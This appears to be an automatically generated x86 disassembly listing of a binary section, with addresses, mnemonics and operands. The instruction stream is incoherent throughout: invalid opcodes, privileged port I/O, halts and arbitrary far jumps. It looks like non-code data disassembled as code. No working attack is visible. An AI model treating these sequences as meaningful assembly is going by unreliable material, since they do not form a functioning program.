  417270:	addr16 push ss
  417272:	adc    al,0x8e
  417274:	or     edi,DWORD PTR [ebp+0x3fd44eee]
  41727a:	pusha  
  41727b:	lods   eax,DWORD PTR ds:[esi]
  41727c:	shl    ch,1
  41727e:	loopne 0x4172e2
  417280:	push   cs
  417281:	in     eax,0xaf
  417283:	outs   dx,DWORD PTR ds:[esi]
  417284:	stos   BYTE PTR es:[edi],al
  417285:	js     0x41729b
  417287:	loopne 0x417219
  417289:	push   esi
  41728a:	push   0xffffffb3
  41728c:	cmp    eax,0xd3451223
  417291:	mov    ds:0x5924b573,al
  417296:	sti    
  417297:	cmp    BYTE PTR [edx-0x60],bh
  41729a:	xor    edi,DWORD PTR [edi-0x5e]
  41729d:	aaa    
  41729e:	fild   DWORD PTR [ebx+0x3a092496]
  4172a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172a5:	mov    esp,0xcc9747ba
  4172aa:	cmp    al,0x8f
  4172ac:	int3   
  4172ad:	mov    ch,0xc3
  4172af:	pop    edi
  4172b0:	cld    
  4172b1:	in     al,dx
  4172b2:	cmp    cl,0x3c
  4172b5:	hlt    
  4172b6:	loopne 0x417337
  4172b8:	or     DWORD PTR [ebp-0x33],0x1df22262
  4172bf:	sbb    edi,ebx
  4172c1:	nop
  4172c2:	xchg   esp,eax
  4172c3:	hlt    
  4172c4:	push   edx
  4172c5:	jmp    0xd641:0x95a90ef4
  4172cc:	aaa    
  4172cd:	addr16 (bad) 
  4172cf:	push   ecx
  4172d0:	sbb    BYTE PTR [esp+eax*4+0x6b],0x63
  4172d5:	add    eax,esi
  4172d7:	test   eax,0x81bc214f
  4172dc:	mov    edi,0x7581b97b
  4172e1:	das    
  4172e2:	mov    al,0x67
  4172e4:	mov    ebp,DWORD PTR [ebx]
  4172e6:	sub    al,0x1b
  4172e8:	out    0x3b,eax
  4172ea:	das    
  4172eb:	nop
  4172ec:	ror    DWORD PTR [ecx-0x41c5774f],cl
  4172f2:	and    al,0xb3
  4172f4:	jl     0x4172da
  4172f6:	jb     0x4172d6
  4172f8:	mov    eax,ds:0x12507d0d
  4172fd:	fcmovne st,st(2)
  4172ff:	add    edx,0xffffffd8
  417302:	jno    0x4172d2
  417304:	sbb    BYTE PTR ds:[edi+0x77b2ccca],dl
  41730b:	cli    
  41730c:	mov    esp,0x3d1c08e5
  417311:	sti    
  417312:	and    al,BYTE PTR [esp+edx*8-0x6823ea94]
  417319:	ret    0x7e33
  41731c:	lock rcr eax,cl
  41731f:	out    0x9d,al
  417321:	mov    WORD PTR [esi+0x63],gs
  417324:	sub    eax,DWORD PTR [edx+edi*2-0xf]
  417328:	mov    ebp,0xb279e3b3
  41732d:	scas   al,BYTE PTR es:[edi]
  41732e:	retf   0x3b84
  417331:	mov    ecx,0xdf267513
  417336:	jmp    0x599c:0xde89c472
  41733d:	arpl   WORD PTR [edi-0x2],dx
  417340:	pop    esi
	...
  4173b1:	add    BYTE PTR [eax],al
  4173b3:	add    bl,dh
  4173b5:	inc    ebx
  4173b6:	ror    cl,1
  4173b8:	lock (bad) 
  4173bb:	jnp    0x4173cb
  4173bd:	jmp    0x41733f
  4173bf:	sbb    al,0xd4
  4173c1:	dec    ecx
  4173c2:	sub    al,0x86
  4173c4:	jns    0x4173c3
  4173c6:	add    BYTE PTR [eax],al
  4173c8:	cmc    
  4173c9:	add    BYTE PTR [eax],al
  4173cb:	add    BYTE PTR [esi+0x73a22d79],al
  4173d1:	mov    esp,0xc4f4d
  4173d6:	mov    ebx,0x282af18b
  4173db:	adc    eax,0xabf070d8
  4173e0:	mov    eax,0x98fd7cc8
  4173e5:	xor    bh,dl
  4173e7:	xor    al,0x7d
  4173e9:	inc    esi
  4173ea:	mov    esi,0x96fa1f07
  4173ef:	mov    ecx,0xc9eb4768
  4173f4:	cmp    eax,0xb6a90b3c
  4173f9:	out    0x5b,eax
  4173fb:	pusha  
  4173fc:	add    al,0xd0
  4173fe:	fld    st(6)
  417400:	shl    ecx,0xef
  417403:	mov    cl,0x26
  417405:	stos   DWORD PTR es:[edi],eax
  417406:	lds    edx,FWORD PTR [ebp-0x438cf953]
  41740c:	sub    BYTE PTR [eax],bl
  41740e:	ja     0x4173dd
  417410:	inc    edi
  417411:	mov    cl,BYTE PTR [edi+0x46051ec]
  417417:	mov    esi,0xd4142b9b
  41741c:	push   esi
  41741d:	xchg   edi,eax
  41741e:	push   ss
  41741f:	int    0x25
  417421:	loopne 0x4173c0
  417423:	push   es
  417424:	test   DWORD PTR [esi+eax*8],edx
  417427:	(bad)  
  417428:	fstp   DWORD PTR [edx]
  41742a:	mov    cl,0xd7
  41742c:	sub    eax,0x69e31fbf
  417431:	and    BYTE PTR [esi+0x3b2b3d89],dl
  417437:	imul   eax,DWORD PTR ds:[ebx],0x8da78777
  41743e:	adc    ecx,DWORD PTR [esp+ecx*4]
  417441:	and    bh,dl
  417443:	outs   dx,BYTE PTR ds:[esi]
  417444:	or     al,0x12
  417446:	hlt    
  417447:	in     al,dx
  417448:	pop    dx
  41744a:	imul   edi,DWORD PTR [ebx],0x76
  41744d:	sahf   
  41744e:	push   cs
  41744f:	jbe    0x417497
  417451:	jnp    0x41743d
  417453:	fidivr WORD PTR [eax-0x49]
  417456:	mov    ebp,0x5ab5cdb6
  41745b:	stos   BYTE PTR es:[edi],al
  41745c:	cmp    cl,ah
  41745e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41745f:	pop    edx
  417460:	or     ch,0xf6
  417463:	add    eax,0x18ffa3c7
  417468:	xchg   ebx,eax
  417469:	scas   al,BYTE PTR es:[edi]
  41746a:	jbe    0x417410
  41746c:	dec    edx
  41746d:	add    DWORD PTR [esi],edi
  41746f:	rcr    BYTE PTR [ecx],1
  417471:	sti    
  417472:	in     al,0x4a
  417474:	cmp    DWORD PTR [esi+ebx*1+0xb0211e1],edi
  41747b:	adc    al,0xaa
  41747d:	lock add bl,BYTE PTR [edx-0x49]
  417481:	add    DWORD PTR [ebx],0x1576151a
  417487:	loop   0x417472
  417489:	ret    0xf714
  41748c:	outs   dx,DWORD PTR ds:[esi]
  41748d:	pop    es
  41748e:	cld    
  41748f:	and    al,0x5e
  417491:	sahf   
  417492:	jo     0x41741a
  417494:	mul    BYTE PTR [edi]
  417496:	jb     0x417488
  417498:	xchg   esi,eax
  417499:	ds jae 0x417500
  41749c:	jne    0x4174aa
  41749e:	call   0x2efef204
  4174a3:	and    al,0xad
  4174a5:	inc    ebp
  4174a6:	dec    ebx
  4174a7:	mov    ds:0xfcecbde,eax
  4174ac:	imul   ebx,DWORD PTR [edi+0x6d9799f],0x56
  4174b3:	arpl   WORD PTR [eax-0x6eea6d65],di
  4174b9:	lock pop edi
  4174bb:	lods   eax,DWORD PTR ds:[esi]
  4174bc:	jmp    0x417454
  4174be:	(bad)  
  4174bf:	sub    eax,0x71
	...
  417534:	and    eax,0xfff32bd8
  417539:	repz std 
  41753b:	fimul  WORD PTR [edx]
  41753d:	mov    edi,0x2d123b7a
  417542:	sbb    eax,0xfe6e2d
  417547:	add    ch,dh
  417549:	add    BYTE PTR [eax],al
  41754b:	add    bh,dh
  41754d:	xor    ah,BYTE PTR [ebx-0x20e39fa8]
  417553:	into   
  417554:	cmova  ebx,DWORD PTR ss:[eax]
  417558:	add    dh,ah
  41755a:	iret   
  41755b:	int    0x98
  41755d:	or     al,0x1
  41755f:	int    0xf6
  417561:	cmp    DWORD PTR [esi+0x47],esi
  417564:	imul   ebx,DWORD PTR [ebx],0xac445b4
  41756a:	sbb    al,0x4e
  41756c:	(bad)  
  41756d:	mov    esp,0x345f321b
  417572:	inc    ebx
  417573:	sub    BYTE PTR [edi],al
  417575:	sub    bl,dl
  417577:	push   eax
  417578:	pop    ss
  417579:	mov    esp,0xb7ca5ce0
  41757e:	cld    
  41757f:	mov    ds:0xee3eb680,eax
  417584:	mov    ebx,0x977c807e
  417589:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41758a:	jl     0x4175b9
  41758c:	mov    ch,0x13
  41758e:	mov    ch,0x83
  417590:	ficomp DWORD PTR [ebx-0x47eec9c1]
  417596:	ror    DWORD PTR [eax+0x32],cl
  417599:	pop    eax
  41759a:	mov    WORD PTR [edx+edx*2],cs
  41759d:	ret    0xb630
  4175a0:	add    DWORD PTR [ecx+0x4e],ebp
  4175a3:	addr16 pop esi
  4175a5:	xchg   ebp,eax
  4175a6:	xlat   BYTE PTR ds:[ebx]
  4175a7:	sbb    al,0x90
  4175a9:	stos   BYTE PTR es:[edi],al
  4175aa:	and    al,0x58
  4175ac:	sub    ecx,DWORD PTR [edx+0xc1e84d4]
  4175b2:	faddp  st(5),st
  4175b4:	punpckldq mm7,DWORD PTR [edx-0x9f6d8a0]
  4175bb:	jb     0x41758c
  4175bd:	inc    ecx
  4175be:	mov    bl,0x51
  4175c0:	stos   DWORD PTR es:[edi],eax
  4175c1:	mov    ecx,0x2f9aa4d3
  4175c6:	xchg   edx,edi
  4175c8:	and    bl,BYTE PTR [ebx-0x40]
  4175cb:	jecxz  0x4175c2
  4175cd:	push   edi
  4175ce:	jbe    0x4175a3
  4175d0:	adc    al,0x5a
  4175d2:	push   cs
  4175d3:	js     0x4175e2
  4175d5:	mov    ch,0xe0
  4175d7:	leave  
  4175d8:	ss push ss
  4175da:	cmp    ah,al
  4175dc:	ins    DWORD PTR es:[edi],dx
  4175dd:	ins    DWORD PTR es:[edi],dx
  4175de:	xchg   esp,eax
  4175df:	aas    
  4175e0:	fwait
  4175e1:	and    al,0x6f
  4175e3:	inc    esp
  4175e4:	sub    DWORD PTR [edi+0x21d1603d],0x257ba315
  4175ee:	stos   DWORD PTR es:[edi],eax
  4175ef:	in     al,0x74
  4175f1:	sbb    eax,0xf78a962f
  4175f6:	fucom  st(7)
  4175f8:	leave  
  4175f9:	sub    al,0x24
  4175fb:	lods   al,BYTE PTR ds:[esi]
  4175fc:	repz mov edx,0x94a90ca3
  417602:	(bad)  
  417603:	outs   dx,BYTE PTR ds:[esi]
  417604:	mov    esp,DWORD PTR [edx+0x5d07d0c4]
  41760a:	jae    0x4175c4
  41760c:	xor    eax,0x2acaf6c8
  417611:	adc    BYTE PTR [ebx],al
  417613:	xor    al,0x27
  417615:	scas   eax,DWORD PTR es:[edi]
  417616:	icebp  
  417617:	add    DWORD PTR ss:[edi+0x23951047],ebx
  41761e:	sar    BYTE PTR [ecx+0x32],cl
  417621:	sahf   
  417622:	(bad)  
  417623:	fcomi  st,st(4)
  417625:	push   ss
  417626:	sbb    al,0xfb
  417628:	sbb    DWORD PTR [esi-0x30cc2142],edx
  41762e:	js     0x4175df
  417630:	xor    dh,0x89
  417633:	fisub  DWORD PTR [esi+0x56]
  417636:	ins    DWORD PTR es:[edi],dx
  417637:	dec    ebx
  417638:	nop
  417639:	outs   dx,DWORD PTR ds:[esi]
  41763a:	or     ebx,DWORD PTR [edx]
  41763c:	retf   
  41763d:	test   ecx,ecx
  41763f:	fbld   TBYTE PTR [edi+0x0]
	...
  4176b2:	add    BYTE PTR [eax],al
  4176b4:	(bad)  
  4176b5:	(bad)  
  4176b7:	(bad)  
  4176b8:	(bad)  
  4176ba:	out    0xff,eax
  4176bc:	xchg   BYTE PTR [eax],dh
  4176be:	jns    0x4176dd
  4176c0:	iret   
  4176c1:	mov    edx,0xff635fe5
  4176c6:	add    BYTE PTR [eax],al
  4176c8:	cmc    
  4176c9:	add    BYTE PTR [eax],al
  4176cb:	add    BYTE PTR [eax],cl
  4176cd:	add    al,0x28
  4176cf:	lahf   
  4176d0:	push   edi
  4176d1:	je     0x4176f4
  4176d3:	fnsave [edx+0x20]
  4176d6:	or     bl,BYTE PTR [edi-0x2b1575f9]
  4176dc:	sbb    al,0xcf
  4176de:	aam    0x83
  4176e0:	sub    esi,DWORD PTR [ebx+0x55]
  4176e3:	dec    ebp
  4176e4:	mov    BYTE PTR [edx],dl
  4176e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176e7:	jo     0x417730
  4176e9:	rol    DWORD PTR [ebx+0x53f70bcf],0xc8
  4176f0:	in     al,dx
  4176f1:	inc    ebp
  4176f2:	(bad)  
  4176f3:	mov    eax,0xd4d42e62
  4176f8:	mov    cl,0x4
  4176fa:	scas   al,BYTE PTR es:[edi]
  4176fb:	rol    ebx,1
  4176fd:	jno    0x417689
  4176ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417700:	(bad)  
  417701:	sbb    DWORD PTR [edx-0x77],ebx
  417704:	ins    DWORD PTR es:[edi],dx
  417705:	inc    eax
  417706:	sbb    al,0xf
  417708:	fs push edx
  41770a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41770b:	mov    cl,dh
  41770d:	fsubr  DWORD PTR [edx]
  41770f:	add    ebp,DWORD PTR [eax]
  417711:	dec    edx
  417712:	pop    eax
  417713:	mov    eax,0xa3bff67c
  417718:	adc    ecx,DWORD PTR [eax+edi*1]
  41771b:	cmp    BYTE PTR [ebx+0x635260a9],cl
  417721:	ret    
  417722:	ins    DWORD PTR es:[edi],dx
  417723:	pop    ebx
  417724:	sub    cl,cl
  417726:	or     BYTE PTR [ebp+0x35],bh
  417729:	mov    al,0x93
  41772b:	and    edi,DWORD PTR [edi+edx*8+0x6aa1382b]
  417732:	sbb    eax,0xe5b495a
  417737:	enter  0xcf40,0xe7
  41773b:	popa   
  41773c:	outs   dx,BYTE PTR ds:[esi]
  41773d:	push   ebx
  41773e:	lock fucomip st,st(3)
  417741:	js     0x41776a
  417743:	and    al,0xa3
  417745:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417746:	inc    esp
  417747:	fld    DWORD PTR ds:0xcc639775
  41774d:	mov    esi,ebp
  41774f:	adc    ebp,DWORD PTR cs:[ebx+0x2a]
  417753:	inc    edi
  417754:	int3   
  417755:	fadd   QWORD PTR [edi+esi*1]
  417758:	pop    ss
  417759:	jmp    0x76b3:0x8226400
  417760:	iret   
  417761:	push   ebx
  417762:	ins    DWORD PTR es:[edi],dx
  417763:	jae    0x417717
  417765:	xchg   esi,eax
  417766:	ss std 
  417768:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417769:	mov    BYTE PTR [edi-0x1f],dh
  41776c:	pusha  
  41776d:	xor    ch,BYTE PTR [esi]
  41776f:	daa    
  417770:	movups xmm0,xmm4
  417773:	pop    ss
  417774:	or     DWORD PTR [ebx+0x7717f075],0x5f
  41777b:	mov    al,ds:0x3f70aa5a
  417780:	shl    BYTE PTR [edx+0x768fde0c],cl
  417786:	jae    0x417709
  417788:	adc    al,0x93
  41778a:	lea    edi,[ebx-0x20]
  41778d:	add    DWORD PTR [edx+eiz*8+0x52],edi
  417791:	jno    0x41772d
  417793:	cs test al,0x7f
  417796:	mov    esi,0xfaae1ff4
  41779b:	and    al,0xda
  41779d:	jns    0x41780b
  41779f:	enter  0x65cf,0xa9
  4177a3:	idiv   DWORD PTR [eax+0x77]
  4177a6:	push   ebp
  4177a7:	cmp    eax,0x8fa1005a
  4177ac:	bound  ecx,QWORD PTR [ecx-0x27ed5a1b]
  4177b2:	ficom  DWORD PTR [edx-0x4976922f]
  4177b8:	sub    al,0xf6
  4177ba:	mov    ds:0x3fb8c831,al
  4177bf:	loop   0x4177d2
	...
  417831:	add    BYTE PTR [eax],al
  417833:	add    cl,dl
  417835:	scas   eax,DWORD PTR es:[edi]
  417836:	push   es
  417837:	repz jle 0x417835
  41783a:	cmc    
  41783b:	scas   eax,DWORD PTR es:[edi]
  41783c:	mov    ebx,0xcc7d6e99
  417841:	jo     0x4177ef
  417843:	retf   0x58
  417846:	add    DWORD PTR [eax],eax
  417848:	cmc    
  417849:	add    BYTE PTR [eax],al
  41784b:	add    BYTE PTR [edx+0x32d56b5],bh
  417851:	(bad)  
  417852:	cdq    
  417853:	loope  0x4178c3
  417855:	imul   ebp,DWORD PTR [ebx-0x74],0x65c92507
  41785c:	xor    DWORD PTR [ebx-0x4373a8b5],ecx
  417862:	fmul   QWORD PTR [eax]
  417864:	dec    ebx
  417865:	mov    ds:0xfab41ffe,al
  41786a:	fimul  WORD PTR [esi+0x44]
  41786d:	inc    ecx
  41786e:	int    0xac
  417870:	or     ebp,DWORD PTR [edi]
  417872:	or     esp,DWORD PTR [edi]
  417874:	rcr    BYTE PTR [edi-0x719ebde2],cl
  41787a:	xchg   dl,dl
  41787c:	retf   0xd719
  41787f:	mov    eax,ds:0x2232fca5
  417884:	imul   ebx,DWORD PTR [ebp-0x1e],0xaa399149
  41788b:	xchg   BYTE PTR [eax+0x6e],dl
  41788e:	pop    ebx
  41788f:	xor    BYTE PTR [eax],bh
  417891:	in     eax,dx
  417892:	pushf  
  417893:	xchg   esp,eax
  417894:	cs (bad) 
  417896:	jmp    0xfe7b:0x665e5c35
  41789d:	test   esp,ebp
  41789f:	out    0xce,eax
  4178a1:	in     eax,0xda
  4178a3:	ss sbb eax,0x828eda36
  4178a9:	daa    
  4178aa:	pushf  
  4178ab:	cmp    bl,BYTE PTR [ecx+0x26]
  4178ae:	enter  0x268e,0x42
  4178b2:	dec    ecx
  4178b3:	(bad)  
  4178b5:	mov    edx,0x8d94baca
  4178ba:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4178bc:	popf   
  4178bd:	push   es
  4178be:	mov    ch,0x40
  4178c0:	sbb    al,BYTE PTR [esp+ebx*1-0x1afaacaa]
  4178c7:	jp     0x41786e
  4178c9:	popa   
  4178ca:	mov    cl,0xd0
  4178cc:	sbb    edx,ebp
  4178ce:	and    DWORD PTR [esi],eax
  4178d0:	vpsubusw ymm6,ymm6,YMMWORD PTR [edi-0x54]
  4178d5:	mov    ah,0xca
  4178d7:	mov    eax,DWORD PTR [eax+esi*1]
  4178da:	and    al,0xf1
  4178dc:	div    ah
  4178de:	loopne 0x41792e
  4178e0:	fadd   DWORD PTR [eax-0x72207387]
  4178e6:	xor    eax,0x79d10949
  4178eb:	jno    0x4178b9
  4178ed:	daa    
  4178ee:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178f0:	pop    ebp
  4178f1:	xchg   BYTE PTR [ebx+esi*4+0x4c],cl
  4178f5:	jo     0x4178c1
  4178f7:	imul   ebp,DWORD PTR [ebx],0x4c7086c4
  4178fd:	xor    BYTE PTR [esi-0x52],bh
  417900:	mov    esi,0xee0d11e1
  417905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417906:	out    0x3d,al
  417908:	scas   eax,DWORD PTR es:[edi]
  417909:	jp     0x4178ca
  41790b:	jp     0x4178c7
  41790d:	imul   eax,ecx,0x4
  417910:	cdq    
  417911:	pop    edi
  417912:	sbb    dh,BYTE PTR [ebx+0xc]
  417915:	lock adc al,0x6c
  417918:	and    ebp,DWORD PTR [ebp+0x20]
  41791b:	loopne 0x4178e0
  41791d:	push   0x12
  41791f:	pop    ebp
  417920:	inc    edx
  417921:	(bad)  
  417922:	push   0x5f
  417924:	leave  
  417925:	loop   0x4178c7
  417927:	pop    esp
  417928:	iret   
  417929:	add    DWORD PTR [ebp+0x73f0f70e],0x23
  417930:	scas   eax,DWORD PTR es:[edi]
  417931:	fisub  WORD PTR [edx]
  417933:	push   esi
  417934:	arpl   WORD PTR [edx+ecx*1-0x5b],ax
  417938:	sbb    al,0x8f
  41793a:	mov    edx,DWORD PTR [ebx+0x57abc482]
  417940:	pop    ss
	...
  4179b1:	add    BYTE PTR [eax],al
  4179b3:	add    bl,cl
  4179b5:	pusha  
  4179b6:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  4179bc:	lea    esi,[esi+0x61acc980]
  4179c2:	pop    esp
  4179c3:	in     al,dx
  4179c4:	dec    ebp
  4179c5:	add    DWORD PTR [ecx],eax
  4179c7:	add    ch,dh
  4179c9:	add    BYTE PTR [eax],al
  4179cb:	add    BYTE PTR [edi],bh
  4179cd:	push   ebx
  4179ce:	push   ss
  4179cf:	xchg   esp,eax
  4179d0:	lds    ebp,FWORD PTR [ecx-0x5d047ae5]
  4179d6:	xor    DWORD PTR [eax+0x4ac9895f],0xeb857bbe
  4179e0:	clc    
  4179e1:	or     eax,0xc2d9cae1
  4179e6:	inc    ebx
  4179e7:	xor    al,0x99
  4179e9:	out    dx,eax
  4179ea:	push   ebx
  4179eb:	and    esp,DWORD PTR [eax+0x6f]
  4179ee:	pop    edi
  4179ef:	fcomp  DWORD PTR [edi-0x7df0e942]
  4179f5:	xchg   ebp,eax
  4179f6:	mov    cl,ah
  4179f8:	inc    BYTE PTR [ebx+0x6e]
  4179fb:	xchg   edx,eax
  4179fd:	adc    DWORD PTR [eax+0x3a],0x41
  417a01:	pop    eax
  417a02:	mov    ds:0xc90890dd,eax
  417a07:	fcom   DWORD PTR [esi-0x3c]
  417a0a:	stos   DWORD PTR es:[edi],eax
  417a0b:	add    BYTE PTR [ebp+edx*4-0x7a6424f9],bh
  417a12:	lea    esp,ds:0x3a5251d3
  417a18:	div    edx
  417a1a:	popa   
  417a1b:	adc    eax,0x86a281dd
  417a20:	shr    DWORD PTR ds:0x8862011a,1
  417a26:	cs jae 0x417a06
  417a29:	dec    esi
  417a2a:	jnp    0x417a73
  417a2c:	mov    ebp,0x768bdb49
  417a31:	dec    esp
  417a32:	cmp    BYTE PTR [edx],ch
  417a34:	outs   dx,BYTE PTR ds:[esi]
  417a35:	xor    ecx,esp
  417a37:	pop    es
  417a38:	mov    edi,0xe8f840c
  417a3e:	pop    esp
  417a3f:	or     DWORD PTR [eax],ecx
  417a41:	dec    edi
  417a42:	scas   eax,DWORD PTR es:[edi]
  417a43:	(bad)  
  417a44:	icebp  
  417a45:	mov    edi,0xb38dc10b
  417a4a:	aam    0x47
  417a4c:	leave  
  417a4d:	jecxz  0x417a64
  417a4f:	xchg   ebx,eax
  417a50:	adc    ch,BYTE PTR [ecx-0x1b8e32a2]
  417a56:	sub    al,0xd4
  417a58:	lds    ecx,FWORD PTR [esi]
  417a5a:	sahf   
  417a5b:	ds xor eax,0x4744f4e6
  417a61:	jnp    0x417a5c
  417a63:	scas   al,BYTE PTR es:[edi]
  417a64:	lahf   
  417a65:	in     al,0xf4
  417a67:	pusha  
  417a68:	dec    esi
  417a69:	adc    al,0x5a
  417a6b:	add    al,0x6f
  417a6d:	jmp    0x6c02:0x1906e1b6
  417a74:	ja     0x4179f8
  417a76:	xchg   ebp,eax
  417a77:	and    al,BYTE PTR ds:0xfd05d003
  417a7d:	xchg   esp,eax
  417a7e:	add    bl,BYTE PTR [esi]
  417a80:	mov    eax,DWORD PTR [ebx]
  417a82:	sbb    DWORD PTR [ebx-0x40],edi
  417a85:	jo     0x417a5a
  417a87:	push   edx
  417a88:	jle    0x417aec
  417a8a:	sbb    ebx,ebp
  417a8c:	inc    esp
  417a8d:	pop    ebx
  417a8e:	mov    dh,BYTE PTR [esi]
  417a90:	push   es
  417a91:	dec    ecx
  417a92:	popa   
  417a93:	sbb    DWORD PTR [ebp+0x16],0xe70265fd
  417a9a:	add    BYTE PTR [edx+0x66],al
  417a9d:	arpl   WORD PTR [ecx],bx
  417a9f:	sub    BYTE PTR [bp+0x5],dl
  417aa3:	xchg   edx,eax
  417aa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417aa5:	mov    edi,DWORD PTR [ecx-0x7065741c]
  417aab:	leave  
  417aac:	pop    edi
  417aad:	mov    ah,cl
  417aaf:	fisttp QWORD PTR [ebx]
  417ab1:	frstor [edi]
  417ab3:	xor    al,0x36
  417ab5:	add    ebp,DWORD PTR [edi+ebp*1+0x25]
  417ab9:	add    al,0xe4
  417abb:	inc    esp
  417abc:	or     al,BYTE PTR [ecx-0x1e]
  417abf:	inc    ebp
  417ac0:	popf   
	...
  417b31:	add    BYTE PTR [eax],al
  417b33:	add    bl,ah
  417b35:	gs push cs
  417b37:	test   DWORD PTR [esi+0x6a75fbff],0xe6fef5f7
  417b41:	ja     0x417ac8
  417b43:	mov    es,WORD PTR [edx+0x2]
  417b46:	add    DWORD PTR [eax],eax
  417b48:	cmc    
  417b49:	add    BYTE PTR [eax],al
  417b4b:	add    bl,dl
  417b4d:	mov    dh,0x8c
  417b4f:	cmp    eax,0xc5e03d12
  417b54:	jg     0x417b65
  417b56:	iret   
  417b57:	fidivr WORD PTR ds:0xc574f139
  417b5d:	fidiv  WORD PTR [edx+0xd68761]
  417b63:	cmp    DWORD PTR [ebx-0x74],esi
  417b66:	sub    edx,DWORD PTR [ebx-0x36b169eb]
  417b6c:	mov    edx,0xb7b8ed64
  417b71:	adc    al,0xec
  417b73:	or     al,0xa3
  417b75:	arpl   WORD PTR [esi-0x37fdbba9],si
  417b7b:	inc    edi
  417b7c:	adc    esp,esp
  417b7e:	mov    cl,0xe
  417b80:	sbb    BYTE PTR [ebp-0x2d94db6e],bl
  417b86:	pop    esp
  417b87:	cmp    ecx,0x28b7ea3c
  417b8d:	mov    ah,BYTE PTR [esi]
  417b8f:	call   0x42c983e9
  417b94:	adc    eax,0xe40119dd
  417b99:	popf   
  417b9a:	push   ss
  417b9b:	pop    esp
  417b9c:	cmp    eax,DWORD PTR ds:0xa92db0ff
  417ba2:	aad    0x59
  417ba4:	dec    ebx
  417ba5:	add    al,0x8b
  417ba7:	std    
  417ba8:	lock lahf 
  417baa:	adc    al,0x10
  417bac:	enter  0xeef4,0xf6
  417bb0:	xlat   BYTE PTR ds:[ebx]
  417bb1:	lods   al,BYTE PTR ds:[esi]
  417bb2:	add    al,0xa5
  417bb4:	(bad)  
  417bb5:	enter  0xe9a,0x95
  417bb9:	call   0x9121:0xcfeb5370
  417bc0:	mov    eax,ds:0xd8380805
  417bc5:	pop    ebx
  417bc6:	jmp    0xc7aa:0xfd73021c
  417bcd:	out    0xc,eax
  417bcf:	mov    WORD PTR [esp+ecx*1],gs
  417bd2:	out    0x29,eax
  417bd4:	mov    ch,0x6a
  417bd6:	out    0x44,al
  417bd8:	cld    
  417bd9:	cmc    
  417bda:	fsubr  DWORD PTR [ebp+0x2873875f]
  417be0:	xchg   esp,eax
  417be1:	imul   edx,DWORD PTR [esi-0xd],0xffffffa8
  417be5:	imul   esi,DWORD PTR [esp+eiz*8],0xa6088e64
  417bec:	push   ebx
  417bed:	ja     0x417c43
  417bef:	fcmovne st,st(3)
  417bf1:	adc    ebp,DWORD PTR [esi+0x397881d]
  417bf7:	inc    esp
  417bf8:	les    ecx,FWORD PTR [ebx-0x17]
  417bfb:	mov    ecx,0x26742426
  417c00:	fmul   DWORD PTR [esi]
  417c02:	jl     0x417bed
  417c04:	leave  
  417c05:	les    edi,FWORD PTR [ecx]
  417c07:	jge    0x417c6e
  417c09:	xor    BYTE PTR cs:[esi+edi*4],0x73
  417c0e:	mov    al,0x28
  417c10:	jge    0x417c64
  417c12:	sub    DWORD PTR [edx],edi
  417c14:	mov    dl,0x9b
  417c16:	fdivr  QWORD PTR [eax+edi*1-0x2e]
  417c1a:	xor    ecx,esi
  417c1c:	retf   0xff85
  417c1f:	sti    
  417c20:	pop    esi
  417c21:	sub    esi,DWORD PTR [ecx-0x22]
  417c24:	mov    bh,dl
  417c26:	or     ch,ch
  417c28:	pop    ds
  417c29:	out    dx,eax
  417c2a:	sbb    edi,DWORD PTR [edi+0x2f]
  417c2d:	inc    ebx
  417c2e:	adc    BYTE PTR [esi+0x69],dl
  417c31:	xor    esp,DWORD PTR [ebp-0x77]
  417c34:	xchg   ebp,eax
  417c35:	sub    al,0xea
  417c37:	mov    esp,0x673c57a3
  417c3c:	xor    al,BYTE PTR ds:0xb8a8d1
	...
  417cb2:	add    BYTE PTR [eax],al
  417cb4:	and    DWORD PTR [ebx-0x40445077],edx
  417cba:	daa    
  417cbb:	lahf   
  417cbc:	(bad)  
  417cbd:	jle    0x417d17
  417cbf:	sbb    DWORD PTR [esi+0x39],esp
  417cc2:	mov    dh,0x77
  417cc4:	aaa    
  417cc5:	add    eax,DWORD PTR [ecx]
  417cc7:	add    ch,dh
  417cc9:	add    BYTE PTR [eax],al
  417ccb:	add    BYTE PTR [edi],bh
  417ccd:	mov    edi,0xa0fbe0a3
  417cd2:	add    al,0xdf
  417cd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cd5:	pop    edx
  417cd6:	and    bl,ah
  417cd8:	(bad)
  417cdb:	gs test al,0x89
  417cde:	je     0x417cd1
  417ce0:	data16 add ah,BYTE PTR [edi-0x7e05e385]
  417ce7:	add    eax,0xcb03c8fd
  417cec:	ja     0x417d2f
  417cee:	leave  
  417cef:	mov    ecx,0x18fc381c
  417cf4:	popa   
  417cf5:	bound  edx,QWORD PTR [edi-0x3ee94924]
  417cfb:	sbb    al,0x27
  417cfd:	lds    eax,FWORD PTR [edi+0xaef5200]
  417d03:	shl    BYTE PTR [edx-0x7f],0x75
  417d07:	mov    edx,0xa7f296a5
  417d0c:	loopne 0x417cb4
  417d0e:	aaa    
  417d0f:	fst    QWORD PTR [edi+0x44823953]
  417d15:	data16 fwait
  417d17:	add    eax,0xc11feada
  417d1c:	pop    ebp
  417d1d:	or     al,0xdd
  417d1f:	jmp    0xa1a1:0xb894600d
  417d26:	pop    edi
  417d27:	test   al,0xe2
  417d29:	mov    ebp,0xfd42e128
  417d2e:	scas   al,BYTE PTR es:[edi]
  417d2f:	mov    edi,0xb9be82cc
  417d34:	ret    0xa057
  417d37:	(bad)  
  417d38:	(bad)  [ecx+0x44]
  417d3b:	inc    eax
  417d3c:	adc    edx,ecx
  417d3e:	aad    0xd6
  417d40:	ror    ebx,0x5e
  417d43:	lods   eax,DWORD PTR ds:[esi]
  417d44:	push   eax
  417d45:	jge    0x417cfa
  417d47:	jne    0x417d33
  417d49:	hlt    
  417d4a:	ja     0x417d67
